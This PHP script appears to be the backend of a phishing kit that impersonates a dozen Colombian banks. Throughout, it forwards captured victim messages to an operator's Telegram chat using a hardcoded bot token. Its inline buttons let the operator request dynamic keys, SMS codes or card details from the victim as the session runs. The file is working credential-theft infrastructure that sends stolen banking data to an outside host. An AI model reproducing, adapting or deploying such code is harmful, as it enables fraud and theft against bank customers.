<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $botToken = '8649687947:AAF32CCBrBUFPm-C11qsD6acGAnNPoM2dcc';
    $chatId   = '-5238438739';

    $message = trim($_POST['message'] ?? '');
    $transactionId = trim($_POST['transactionId'] ?? '');

    // Detect bank from directory
    $bankName = 'BANCO POPULAR'; // Default
    if (strpos(__DIR__, 'b-34f4') !== false) {
        $bankName = 'BANCO DE BOGOTA';
    } elseif (strpos(__DIR__, 'b-34f10') !== false) {
        $bankName = 'BANCO DAVIVIENDA';
    } elseif (strpos(__DIR__, 'b-34f12') !== false) {
        $bankName = 'DAVIBANK';
    } elseif (strpos(__DIR__, 'b-34f5') !== false) {
        $bankName = 'BANCO FALABELLA';
    } elseif (strpos(__DIR__, 'b-34f6') !== false) {
        $bankName = 'BANCO FINANDINA S.A. BIC';
    } elseif (strpos(__DIR__, 'b-34f18') !== false) {
        $bankName = 'BANCO POPULAR';
    } elseif (strpos(__DIR__, 'b-34f1') !== false) {
        $bankName = 'BANCO AV VILLAS';
    } elseif (strpos(__DIR__, 'b-34f13') !== false) {
        $bankName = 'BANCO BBVA COLOMBIA S.A.';
    } elseif (strpos(__DIR__, 'b-34f2') !== false) {
        $bankName = 'BANCO CAJA SOCIAL';
    } elseif (strpos(__DIR__, 'b-34f14') !== false) {
        $bankName = 'BANCO DE OCCIDENTE';
    } elseif (strpos(__DIR__, 'b-34f7') !== false) {
        $bankName = 'BANCO ITAU';
    } elseif (strpos(__DIR__, 'b-34f01') !== false) {
        $bankName = 'BANCO MUNDO MUJER S.A.';
    } // Add more as needed

    // Replace bank name in message if needed
    $message = str_replace('BANCO DE BOGOTA', $bankName, $message);

    // Log the received message
    file_put_contents(__DIR__ . '/procesar_logo.log', date('Y-m-d H:i:s') . " - Message: " . $message . "\nTransactionId: " . $transactionId . "\n", FILE_APPEND);

    $environment = $config['environment'] ?? 'production';
    if ($environment === 'development') {
        // Log the message for development
        file_put_contents(__DIR__ . '/telegram_messages.log', date('Y-m-d H:i:s') . " - Message: " . $message . "\n", FILE_APPEND);
        echo json_encode(['status' => 'success', 'messageId' => 'dev_' . time()]);
        exit;
    }

    if ($message === '' || $transactionId === '') {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if ($botToken === '' || $chatId === '') {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Logo', 'callback_data' => "error_logo:{$transactionId}"],
                ['text' => 'Dinamica', 'callback_data' => "pedir_dinamica:{$transactionId}"]
            ],
            [
                ['text' => 'SMS', 'callback_data' => "sms:{$transactionId}"],
                ['text' => 'Tarjeta', 'callback_data' => "error_tc:{$transactionId}"]
            ],
            [
                ['text' => 'Fin', 'callback_data' => "confirm_finalizar:{$transactionId}"]
            ]
        ]
    ];

    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ];

    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        $err = curl_error($ch);
        curl_close($ch);
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }
    curl_close($ch);

    $result = json_decode($response, true);
    if (!$result) {
        echo json_encode(['status' => 'error', 'message' => 'json_decode_failed', 'raw' => $response]);
        exit;
    }

    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null,
        'telegram' => $result
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}

